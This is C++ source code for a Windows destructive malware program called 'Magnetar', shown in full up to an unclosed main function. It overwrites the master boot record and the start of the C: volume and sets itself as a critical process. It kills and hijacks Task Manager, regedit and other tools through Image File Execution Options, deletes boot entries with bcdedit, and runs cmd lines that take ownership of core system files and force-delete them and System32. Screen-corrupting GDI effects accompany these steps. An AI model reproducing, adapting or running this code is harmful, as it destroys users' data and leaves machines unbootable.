#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <math.h>
#include <time.h>
#include <TlHelp32.h>

#include "audio.hpp"
#include "MagnetarMBR.hpp"

#pragma comment(lib, "winmm.lib")

typedef NTSTATUS(NTAPI* RAP)(IN ULONG, IN BOOLEAN, IN BOOLEAN, OUT PBOOLEAN);
typedef NTSTATUS(NTAPI* NSIP)(IN HANDLE, IN ULONG, IN PVOID, IN ULONG);
typedef NTSTATUS(NTAPI* NSS)(IN ULONG);

DWORD state;
HANDLE hHeap = GetProcessHeap();

void srng(DWORD dwSeed)
{
	state = dwSeed;
}

// Mulberry32 source: https://gist.github.com/tommyettinger/46a874533244883189143505d203312c
__inline DWORD rng(void)
{
	DWORD z = (state += 0x6D2B79F5UL);
	z = (z ^ (z >> 15)) * (z | 1UL);
	z ^= z + (z ^ (z >> 7)) * (z | 61UL);
	return z ^ (z >> 14);
}

DWORD FindProcessID(LPCWSTR lpProcessName) 
{
	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32W);
	BOOL bSnapProcessRes = Process32FirstW(hProcessSnapshot, &procEntry);
	while (bSnapProcessRes)
	{
		if (!lstrcmpW(procEntry.szExeFile, lpProcessName))
		{
			return procEntry.th32ProcessID;
		}
		bSnapProcessRes = Process32NextW(hProcessSnapshot, &procEntry);
	} 
	CloseHandle(hProcessSnapshot);
}

void SuspendProcessID(DWORD dwProcessID)
{
	HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);
	BOOL bSuspendThreadRes = Thread32First(hThreadSnapshot, &threadEntry);
	while (bSuspendThreadRes)
	{
		if (threadEntry.th32OwnerProcessID == dwProcessID)
		{
			HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, threadEntry.th32ThreadID);
			SuspendThread(hThread);
			CloseHandle(hThread);
		}
		bSuspendThreadRes = Thread32Next(hThreadSnapshot, &threadEntry);
	} 
	CloseHandle(hThreadSnapshot);
}

void TerminateProcessName(LPCWSTR lpProcessname)
{
	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W prcs;
	prcs.dwSize = sizeof(PROCESSENTRY32W);
	BOOL bTerminateProcessRes = Process32FirstW(hProcessSnapshot, &prcs);
	while (bTerminateProcessRes)
	{
		if (!lstrcmpW(prcs.szExeFile, lpProcessname))
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, prcs.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
			}
		}
		bTerminateProcessRes = Process32NextW(hProcessSnapshot, &prcs);
	} 
	CloseHandle(hProcessSnapshot);
}

void SetImageFileExecution(LPCWSTR lpProgramName)
{
        WCHAR* wRegPath = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, (MAX_PATH * 2 + 1) * sizeof(WCHAR));
        lstrcpyW(wRegPath, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\");
        lstrcatW(wRegPath, lpProgramName);
 
	HKEY hKey;
	LPCWSTR lpData = L"winlogon.exe";
	RegCreateKeyExW(HKEY_LOCAL_MACHINE, wRegPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);

	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, wRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
	{
		RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (LPBYTE)lpData, (lstrlenW(lpData) + 1) * sizeof(WCHAR));

	}
	RegCloseKey(hKey);
        HeapFree(hHeap, NULL, wRegPath);
}

DWORD WINAPI wipedisk(IN LPVOID lpParam)
{
	DWORD wipeC;
	LPVOID lpZero = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 5120);
	HANDLE HDiskC = CreateFileW(L"\\\\.\\C:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	SetFilePointer(HDiskC, 0, NULL, FILE_BEGIN);
	WriteFile(HDiskC, lpZero, 5120, &wipeC, NULL);
	HeapFree(hHeap, NULL, lpZero);
	CloseHandle(HDiskC);

	DWORD wipe0;
	HANDLE HDisk0 = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	SetFilePointer(HDisk0, 1024, NULL, FILE_BEGIN);
	WriteFile(HDisk0, flush, 161916, &wipe0, NULL);
	CloseHandle(HDisk0);
	ExitThread(0);
}
	
DWORD WINAPI msgbox(IN LPVOID lpParam)
{
	while (TRUE)
	{
		MessageBoxW(NULL, L" ", L" ", MB_YESNO | MB_ICONERROR);
	}
}

DWORD WINAPI magnetargdipayloads(IN LPVOID lpParam)
{
	int width;
	int height;
	int iconx;
	int icony;
	HICON error;
	HWND hwnd;
	HDC hdc;
	RECT rekt;
	COLORREF clrrainbow;
	HBRUSH rainbow;

	srng(GetTickCount());

	PlaySoundW(L"C:\\Windows\\Temp\\noises.wav", NULL, SND_FILENAME | SND_ASYNC);

	clock_t payload1 = clock();
	while ((clock() - payload1) / CLOCKS_PER_SEC <= 10)
	{
		hwnd = GetDesktopWindow();
		hdc = GetDC(NULL);
		rekt;
		GetWindowRect(hwnd, &rekt);

		BitBlt(hdc, rekt.left + rng() % 1 + 1, rekt.top + rng() % 1 + 1, rekt.right + rng() % 1 + 1, rekt.bottom + rng() % 1 + 1, hdc, rekt.left, rekt.top, SRCAND);
		Sleep(100);
	}
	clock_t payload2 = clock();
	while ((clock() - payload2) / CLOCKS_PER_SEC <= 10)
	{
		hwnd = GetDesktopWindow();
		hdc = GetDC(NULL);
		rekt;
		GetWindowRect(hwnd, &rekt);

		BitBlt(hdc, rekt.left + rng() % 1 + 1, rekt.top + rng() % 1 + 1, rekt.right + rng() % 1 + 1, rekt.bottom + rng() % 1 + 1, hdc, rekt.left, rekt.top, SRCPAINT);
		BitBlt(hdc, rekt.left + rng() % 1 + 1, rekt.top + rng() % 1 + 1, rekt.right + rng() % 1 + 1, rekt.bottom + rng() % 1 + 1, hdc, rekt.left, rekt.top, SRCINVERT);
		Sleep(100);
	}

	clock_t payload3 = clock();
	while ((clock() - payload3) / CLOCKS_PER_SEC <= 15)
	{
		width = GetSystemMetrics(SM_CXSCREEN);
		height = GetSystemMetrics(SM_CYSCREEN);
		hwnd = GetDesktopWindow();
		hdc = GetDC(NULL);
		int xyrng = rng() % width, h = height - rng() % width - (width / 2 - 110);
		clrrainbow = RGB(rng() % 255, rng() % 255, rng() % 255);
		HBRUSH bddiag = CreateHatchBrush(HS_BDIAGONAL, clrrainbow);
		HBRUSH cross = CreateHatchBrush(HS_CROSS, clrrainbow);
		HBRUSH diagcross = CreateHatchBrush(HS_DIAGCROSS, clrrainbow);
		HBRUSH fdiagonal = CreateHatchBrush(HS_FDIAGONAL, clrrainbow);
		HBRUSH hor = CreateHatchBrush(HS_HORIZONTAL, clrrainbow);
		HBRUSH ver = CreateHatchBrush(HS_VERTICAL, clrrainbow);
		
		SelectObject(hdc, bddiag);
		BitBlt(hdc, rng() % width + 0, rng() % height + 0, rng() % width + 0 + 200, rng() % height + 0 + 200, hdc, rng() % width + 0, rng() % height + 0, NOTSRCCOPY);
		BitBlt(hdc, xyrng, height, xyrng, h, hdc, rng() % 100 - 50, xyrng, SRCCOPY);
		PatBlt(hdc, xyrng, height, xyrng, h, PATINVERT);
		PatBlt(hdc, NULL, NULL, width, height, PATINVERT);
		DeleteObject(bddiag);
		Sleep(100);

		SelectObject(hdc, cross);
		BitBlt(hdc, rng() % width + 0, rng() % height + 0, rng() % width + 0 + 200, rng() % height + 0 + 200, hdc, rng() % width + 0, rng() % height + 0, NOTSRCCOPY);
		BitBlt(hdc, xyrng, height, xyrng, h, hdc, rng() % 100 - 50, xyrng, SRCCOPY);
		PatBlt(hdc, xyrng, height, xyrng, h, PATINVERT);
		PatBlt(hdc, NULL, NULL, width, height, PATINVERT);
		DeleteObject(cross);
		Sleep(100);

		SelectObject(hdc, diagcross);
		BitBlt(hdc, rng() % width + 0, rng() % height + 0, rng() % width + 0 + 200, rng() % height + 0 + 200, hdc, rng() % width + 0, rng() % height + 0, NOTSRCCOPY);
		BitBlt(hdc, xyrng, height, xyrng, h, hdc, rng() % 100 - 50, xyrng, SRCCOPY);
		PatBlt(hdc, xyrng, height, xyrng, h, PATINVERT);
		PatBlt(hdc, NULL, NULL, width, height, PATINVERT);
		DeleteObject(diagcross);
		Sleep(100);

		SelectObject(hdc, fdiagonal);
		BitBlt(hdc, rng() % width + 0, rng() % height + 0, rng() % width + 0 + 200, rng() % height + 0 + 200, hdc, rng() % width + 0, rng() % height + 0, NOTSRCCOPY);
		BitBlt(hdc, xyrng, height, xyrng, h, hdc, rng() % 100 - 50, xyrng, SRCCOPY);
		PatBlt(hdc, xyrng, height, xyrng, h, PATINVERT);
		PatBlt(hdc, NULL, NULL, width, height, PATINVERT);
		DeleteObject(fdiagonal);
		Sleep(100);

		SelectObject(hdc, hor);
		BitBlt(hdc, rng() % width + 0, rng() % height + 0, rng() % width + 0 + 200, rng() % height + 0 + 200, hdc, rng() % width + 0, rng() % height + 0, NOTSRCCOPY);
		BitBlt(hdc, xyrng, height, xyrng, h, hdc, rng() % 100 - 50, xyrng, SRCCOPY);
		PatBlt(hdc, xyrng, height, xyrng, h, PATINVERT);
		PatBlt(hdc, NULL, NULL, width, height, PATINVERT);
		DeleteObject(hor);
		Sleep(100);

		SelectObject(hdc, ver);
		BitBlt(hdc, rng() % width + 0, rng() % height + 0, rng() % width + 0 + 200, rng() % height + 0 + 200, hdc, rng() % width + 0, rng() % height + 0, NOTSRCCOPY);
		BitBlt(hdc, xyrng, height, xyrng, h, hdc, rng() % 100 - 50, xyrng, SRCCOPY);
		PatBlt(hdc, xyrng, height, xyrng, h, PATINVERT);
		PatBlt(hdc, NULL, NULL, width, height, PATINVERT);
		DeleteObject(ver);
		Sleep(100);
	}

	clock_t payload4 = clock();
	while ((clock() - payload4) / CLOCKS_PER_SEC <= 10)
	{
		hwnd = GetDesktopWindow();
		hdc = GetDC(NULL);
		rekt;
		GetWindowRect(hwnd, &rekt);

		clrrainbow = RGB(rng() % 255, rng() % 255, rng() % 255);

		for (int a = 0; a < rekt.right; a += 20)
		{
			for (int b = 0; b < rekt.bottom; b += 20)
			{
				SetPixel(hdc, a, b, clrrainbow);
			}
		}

		const double PI = 3.141592653589793238462643383279;
		const int xwave = 50;
		const int ywave = 100;
		for (double i = -2000; i < 2000; i += 0.01)
		{
			double j = sin(PI / xwave * i) * ywave;
			SetPixel(hdc, 200 + i, 200 + j, clrrainbow);
			SetPixel(hdc, 400 + i, 400 + j, clrrainbow);
			SetPixel(hdc, 600 + i, 600 + j, clrrainbow);
		}
	}

	clock_t payload5 = clock();
	while ((clock() - payload5) / CLOCKS_PER_SEC <= 25)
	{
		width = GetSystemMetrics(SM_CXSCREEN);
		height = GetSystemMetrics(SM_CYSCREEN);
		iconx = GetSystemMetrics(SM_CXICON);
		icony = GetSystemMetrics(SM_CYICON);
		error = LoadIconW(NULL, IDI_HAND);
		hwnd = GetDesktopWindow();
		hdc = GetDC(NULL);
		rekt;
		GetWindowRect(hwnd, &rekt);

		clrrainbow = RGB(rng() % 255, rng() % 255, rng() % 255);
		rainbow = CreateSolidBrush(clrrainbow);
		LPCWSTR txtmg = L"You too late to save your computer!";

		SetCursorPos(rng() % width + 1, rng() % height + 1);
		POINT cursor;
		GetCursorPos(&cursor);
		DrawIcon(hdc, cursor.x - iconx, cursor.y - icony, error);

		SelectObject(hdc, rainbow);
		SetTextColor(hdc, clrrainbow);
		SetBkColor(hdc, RGB(0, 0, 255));
		TextOutW(hdc, rng() % width, rng() % height, txtmg, lstrlenW(txtmg));
		TextOutW(hdc, rng() % width, rng() % height, txtmg, lstrlenW(txtmg));
		TextOutW(hdc, rng() % width, rng() % height, txtmg, lstrlenW(txtmg));
		TextOutW(hdc, rng() % width, rng() % height, txtmg, lstrlenW(txtmg));
		Ellipse(hdc, rng() % width, rng() % height, rng() % width, rng() % height);
		Rectangle(hdc, rng() % width, rng() % height, rng() % width, rng() % height);
		RoundRect(hdc, rng() % width, rng() % height, rng() % width, rng() % height, rng() % width, rng() % height);
		Pie(hdc, rng() % width, rng() % height, rng() % width, rng() % height, rng() * 270, rng() * 270, rng() * 180, rng() * 180);

		HGDIOBJ rainbowpen = GetStockObject(DC_PEN);
		SetDCPenColor(hdc, clrrainbow);
		SelectObject(hdc, rainbowpen);
		LineTo(hdc, rng() % (0 - height), 0);
		LineTo(hdc, rng() % (0 - width), height);
		LineTo(hdc, rng() % rekt.right, rng() % rekt.bottom);
		LineTo(hdc, rng() % rekt.right, rng() % rekt.bottom);
		Sleep(100);
	}

	clock_t payload6 = clock();
	while ((clock() - payload6) / CLOCKS_PER_SEC <= 20)
	{
		hwnd = GetDesktopWindow();
		hdc = GetDC(NULL);
		rekt;
		GetWindowRect(hwnd, &rekt);

		BitBlt(hdc, rekt.left, rekt.top + rng() % 10 + 10, rekt.right + 10, rekt.bottom + rng() % 10 + 10, hdc, rekt.left + 10, rekt.top + rng() % 10 + 10, SRCAND);
		BitBlt(hdc, rekt.left, rekt.top + rng() % 10 + 10, rekt.right + 10, rekt.bottom + rng() % 10 + 10, hdc, rekt.left + 10, rekt.top + rng() % 10 + 10, SRCPAINT);

		BitBlt(hdc, rekt.left + rng() % 10 + 10, rekt.top + rng() % 10 + 10, rekt.right + rng() % 10 + 10, rekt.bottom + rng() % 10 + 10, hdc, rekt.left, rekt.top + rng() % 10 + 10, SRCAND);
		BitBlt(hdc, rekt.left + rng() % 10 + 10, rekt.top + rng() % 10 + 10, rekt.right + rng() % 10 + 10, rekt.bottom + rng() % 10 + 10, hdc, rekt.left, rekt.top + rng() % 10 + 10, SRCPAINT);
		Sleep(50);
	}

	clock_t payload7 = clock();
	while ((clock() - payload7) / CLOCKS_PER_SEC <= 20)
	{
		hwnd = GetDesktopWindow();
		hdc = GetDC(NULL);
		rekt;
		GetWindowRect(hwnd, &rekt);

		POINT pt1[3];
		int inc1 = 5;
		inc1++;
		pt1[0].x = rekt.left + 15 + inc1;
		pt1[0].y = rekt.top + 30 - inc1;
		pt1[1].x = rekt.right + 45 + inc1;
		pt1[1].y = rekt.top + 60 - inc1;
		pt1[2].x = rekt.left + 75 - inc1;
		pt1[2].y = rekt.bottom + 90 - inc1;

		PlgBlt(hdc, pt1, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);

		POINT pt2[3];
		int inc2 = 30;
		inc2++;
		pt2[0].x = rekt.left + inc2;
		pt2[0].y = rekt.top + inc2;
		pt2[1].x = rekt.right + inc2;
		pt2[1].y = rekt.top - inc2;
		pt2[2].x = rekt.left - inc2;
		pt2[2].y = rekt.bottom - inc2;

		PlgBlt(hdc, pt2, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);
	}

	PlaySoundW(NULL, NULL, NULL);
	PlaySoundW(L"C:\\Windows\\Temp\\flush.wav", NULL, SND_FILENAME | SND_ASYNC);

	clock_t payload8 = clock();
	while ((clock() - payload8) / CLOCKS_PER_SEC <= 20)
	{
		width = GetSystemMetrics(SM_CXSCREEN);
		height = GetSystemMetrics(SM_CYSCREEN);
		hwnd = GetDesktopWindow();
		hdc = GetDC(NULL);
		rekt;
		GetWindowRect(hwnd, &rekt);
		clrrainbow = RGB(rng() % 255, rng() % 255, rng() % 255);
		rainbow = CreateSolidBrush(clrrainbow);
		SelectObject(hdc, rainbow);
		int xyrng = rng() % width, h = height - rng() % width - (width / 2 - 110);

		POINT pt3[3];
		int inc3 = 60;
		inc3++;
		pt3[0].x = rekt.left + inc3;
		pt3[0].y = rekt.top - inc3;
		pt3[1].x = rekt.right + inc3;
		pt3[1].y = rekt.top + inc3;
		pt3[2].x = rekt.left - inc3;
		pt3[2].y = rekt.bottom - inc3;

		PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);
		PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);

		BitBlt(hdc, xyrng, height, xyrng, h, hdc, rng() % 100 - 50, xyrng, SRCCOPY);
		PatBlt(hdc, xyrng, height, xyrng, h, PATINVERT);
		StretchBlt(hdc, -16, -16, width + 32, height + 32, hdc, NULL, NULL, width, height, SRCCOPY);
		StretchBlt(hdc, -16, -16, width + 32, height + 32, hdc, NULL, NULL, width, height, SRCCOPY);
		StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, NULL, NULL, width, height, SRCCOPY);
		StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, NULL, NULL, width, height, SRCCOPY);
	}
        ReleaseDC(NULL, hdc);
	PlaySoundW(NULL, NULL, NULL);
	ExitThread(0);
}

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (MessageBoxW(NULL, L"Are you sure to run Magnetar?, It will destroy your system!!! ", L"Magnetar", MB_YESNO | MB_ICONEXCLAMATION) != IDYES || MessageBoxW(NULL, L"Last warning!, I am not joking!, Are you sure want run Magnetar?", L"Magnetar", MB_YESNO | MB_ICONEXCLAMATION) != IDYES)
	{
		ExitProcess(0);
	}

	HMODULE hntdll = GetModuleHandleW(L"ntdll.dll");
	RAP RtlAdjustPrivilege = (RAP)GetProcAddress(hntdll, "RtlAdjustPrivilege");
	NSIP NtSetInformationProcess = (NSIP)GetProcAddress(hntdll, "NtSetInformationProcess");
	NSS NtShutdownSystem = (NSS)GetProcAddress(hntdll, "NtShutdownSystem");

	BOOLEAN bl;
	ULONG breakonterminaton1 = 1;
	RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
	NtSetInformationProcess(GetCurrentProcess(), 0x1D, &breakonterminaton1, sizeof(ULONG));

	DWORD overwrite0;
	HANDLE Disk0 = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	SetFilePointer(Disk0, 0, NULL, FILE_BEGIN);
	WriteFile(Disk0, magnetarmbr, 512, &overwrite0, NULL);
	CloseHandle(Disk0);

	DWORD writeflush;
	DWORD writenoise;
	HANDLE hFlush = CreateFileW(L"C:\\Windows\\Temp\\flush.wav", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE hnoises = CreateFileW(L"C:\\Windows\\Temp\\noises.wav", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFlush, flush, 161916, &writeflush, NULL);
	WriteFile(hnoises, noises, 892028, &writenoise, NULL);
	CloseHandle(hFlush);
	CloseHandle(hnoises);

	DWORD dwExplorerPID = FindProcessID(L"explorer.exe");
	SuspendProcessID(dwExplorerPID);
	TerminateProcessName(L"taskmgr.exe");
	TerminateProcessName(L"cmd.exe");
	TerminateProcessName(L"regedit.exe");
	TerminateProcessName(L"ProcessHacker.exe");
	TerminateProcessName(L"procexp.exe");
	TerminateProcessName(L"procexp64.exe");
	TerminateProcessName(L"procexp64a.exe");

	SetImageFileExecution(L"taskmgr.exe");
	SetImageFileExecution(L"explorer.exe");
	SetImageFileExecution(L"regedit.exe");
	SetImageFileExecution(L"ProcessHacker.exe");
	SetImageFileExecution(L"procexp.exe");
	SetImageFileExecution(L"procexp64.exe");
	SetImageFileExecution(L"procexp64a.exe");

	LPSTARTUPINFOW lpsi = (LPSTARTUPINFOW)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(STARTUPINFOW));
	LPPROCESS_INFORMATION lppi = (LPPROCESS_INFORMATION)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(PROCESS_INFORMATION));
	lpsi->cb = sizeof(STARTUPINFOW);

        // Crappy code, you can use some WinAPI function to get System32 folder correctly instead SysWOW64.
	CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", L"/c cd C:\\Windows\\System32\\ & bcdedit /delete {current} & bcdedit /delete {default} & takeown /f C:\\ntldr & takeown /f C:\\Windows\\System32\\hal.dll & takeown /f C:\\Windows\\System32\\ntoskrnl.exe & takeown /f C:\\Windows\\System32\\winresume.exe & takeown /f C:\\Windows\\System32\\winload.exe & takeown /f C:\\Windows\\System32\\drivers\\acpi.sys & takeown /f C:\\Windows\\System32\\drivers\\classpnp.sys & takeown /f C:\\Windows\\System32\\drivers\\disk.sys & takeown /f C:\\Windows\\System32\\drivers\\ndis.sys & takeown /f C:\\Windows\\System32\\drivers\\ntfs.sys & echo y | cacls C:\\ntldr /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\System32\\hal.dll /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\System32\\ntoskrnl.exe /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\System32\\winresume.exe /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\System32\\winload.exe /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\System32\\drivers\\acpi.sys /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\System32\\drivers\\classpnp.sys & echo y | cacls C:\\Windows\\System32\\drivers\\disk.sys /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\System32\\drivers\\ndis.sys /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\System32\\drivers\\ntfs.sys /g \"\"everyone\"\":F & icacls C:\\ntldr /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\hal.dll /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\ntoskrnl.exe /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\winresume.exe /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\winload.exe /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\drivers\\acpi.sys /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\drivers\\classpnp.sys /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\drivers\\disk.sys /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\drivers\\ndis.sys /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\drivers\\ntfs.sys /grant \"\"everyone\"\":F & del /f /q C:\\ntldr & del /f /q C:\\Windows\\System32\\hal.dll & del /f /q C:\\Windows\\System32\\ntoskrnl.exe & del /f /q C:\\Windows\\System32\\winresume.exe & del /f /q C:\\Windows\\System32\\winload.exe & del /f /q C:\\Windows\\System32\\drivers\\acpi.sys & del /f /q C:\\Windows\\System32\\drivers\\classpnp.sys & del /f /q C:\\Windows\\System32\\drivers\\disk.sys & del /f /q C:\\Windows\\System32\\drivers\\ndis.sys & del /f /q C:\\Windows\\System32\\drivers\\ntfs.sys & exit", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, lpsi, lppi);
	CreateProcessW(L"C:\\Windows\\sysnative\\cmd.exe", L"/c cd C:\\Windows\\System32\\ & bcdedit /delete {current} & bcdedit /delete {default} & takeown /f C:\\ntldr & takeown /f C:\\Windows\\System32\\hal.dll & takeown /f C:\\Windows\\System32\\ntoskrnl.exe & takeown /f C:\\Windows\\System32\\winresume.exe & takeown /f C:\\Windows\\System32\\winload.exe & takeown /f C:\\Windows\\System32\\drivers\\acpi.sys & takeown /f C:\\Windows\\System32\\drivers\\classpnp.sys & takeown /f C:\\Windows\\System32\\drivers\\disk.sys & takeown /f C:\\Windows\\System32\\drivers\\ndis.sys & takeown /f C:\\Windows\\System32\\drivers\\ntfs.sys & echo y | cacls C:\\ntldr /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\System32\\hal.dll /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\System32\\ntoskrnl.exe /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\System32\\winresume.exe /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\System32\\winload.exe /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\System32\\drivers\\acpi.sys /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\System32\\drivers\\classpnp.sys & echo y | cacls C:\\Windows\\System32\\drivers\\disk.sys /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\System32\\drivers\\ndis.sys /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\System32\\drivers\\ntfs.sys /g \"\"everyone\"\":F & icacls C:\\ntldr /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\hal.dll /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\ntoskrnl.exe /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\winresume.exe /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\winload.exe /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\drivers\\acpi.sys /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\drivers\\classpnp.sys /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\drivers\\disk.sys /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\drivers\\ndis.sys /grant \"\"everyone\"\":F & icacls C:\\Windows\\System32\\drivers\\ntfs.sys /grant \"\"everyone\"\":F & del /f /q C:\\ntldr & del /f /q C:\\Windows\\System32\\hal.dll & del /f /q C:\\Windows\\System32\\ntoskrnl.exe & del /f /q C:\\Windows\\System32\\winresume.exe & del /f /q C:\\Windows\\System32\\winload.exe & del /f /q C:\\Windows\\System32\\drivers\\acpi.sys & del /f /q C:\\Windows\\System32\\drivers\\classpnp.sys & del /f /q C:\\Windows\\System32\\drivers\\disk.sys & del /f /q C:\\Windows\\System32\\drivers\\ndis.sys & del /f /q C:\\Windows\\System32\\drivers\\ntfs.sys & exit", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, lpsi, lppi);
	CreateProcessW(L"C:\\Windows\\sysnative\\cmd.exe", L"/c cd C:\\Windows\\Sysnative\\ & bcdedit /delete {current} & bcdedit /delete {default} &takeown /f C:\\ntldr & takeown /f C:\\Windows\\sysnative\\hal.dll & takeown /f C:\\Windows\\sysnative\\ntoskrnl.exe & takeown /f C:\\Windows\\sysnative\\winresume.exe & takeown /f C:\\Windows\\sysnative\\winload.exe & takeown /f C:\\Windows\\sysnative\\drivers\\acpi.sys & takeown /f C:\\Windows\\sysnative\\drivers\\classpnp.sys & takeown /f C:\\Windows\\sysnative\\drivers\\disk.sys & takeown /f C:\\Windows\\sysnative\\drivers\\ndis.sys & takeown /f C:\\Windows\\sysnative\\drivers\\ntfs.sys & echo y | cacls C:\\ntldr /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\sysnative\\hal.dll /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\sysnative\\ntoskrnl.exe /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\sysnative\\winresume.exe /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\sysnative\\winload.exe /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\sysnative\\drivers\\acpi.sys /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\sysnative\\drivers\\classpnp.sys & echo y | cacls C:\\Windows\\sysnative\\drivers\\disk.sys /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\sysnative\\drivers\\ndis.sys /g \"\"everyone\"\":F & echo y | cacls C:\\Windows\\sysnative\\drivers\\ntfs.sys /g \"\"everyone\"\":F & icacls C:\\ntldr /grant \"\"everyone\"\":F & icacls C:\\Windows\\sysnative\\hal.dll /grant \"\"everyone\"\":F & icacls C:\\Windows\\sysnative\\ntoskrnl.exe /grant \"\"everyone\"\":F & icacls C:\\Windows\\sysnative\\winresume.exe /grant \"\"everyone\"\":F & icacls C:\\Windows\\sysnative\\winload.exe /grant \"\"everyone\"\":F & icacls C:\\Windows\\sysnative\\drivers\\acpi.sys /grant \"\"everyone\"\":F & icacls C:\\Windows\\sysnative\\drivers\\classpnp.sys /grant \"\"everyone\"\":F & icacls C:\\Windows\\sysnative\\drivers\\disk.sys /grant \"\"everyone\"\":F & icacls C:\\Windows\\sysnative\\drivers\\ndis.sys /grant \"\"everyone\"\":F & icacls C:\\Windows\\sysnative\\drivers\\ntfs.sys /grant \"\"everyone\"\":F & del /f /q C:\\ntldr & del /f /q C:\\Windows\\sysnative\\hal.dll & del /f /q C:\\Windows\\sysnative\\ntoskrnl.exe & del /f /q C:\\Windows\\sysnative\\winresume.exe & del /f /q C:\\Windows\\sysnative\\winload.exe & del /f /q C:\\Windows\\sysnative\\drivers\\acpi.sys & del /f /q C:\\Windows\\sysnative\\drivers\\classpnp.sys & del /f /q C:\\Windows\\sysnative\\drivers\\disk.sys & del /f /q C:\\Windows\\sysnative\\drivers\\ndis.sys & del /f /q C:\\Windows\\sysnative\\drivers\\ntfs.sys & exit", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, lpsi, lppi);
	CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", L"/c del /f /s /q C:\\Windows\\System32", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, lpsi, lppi);
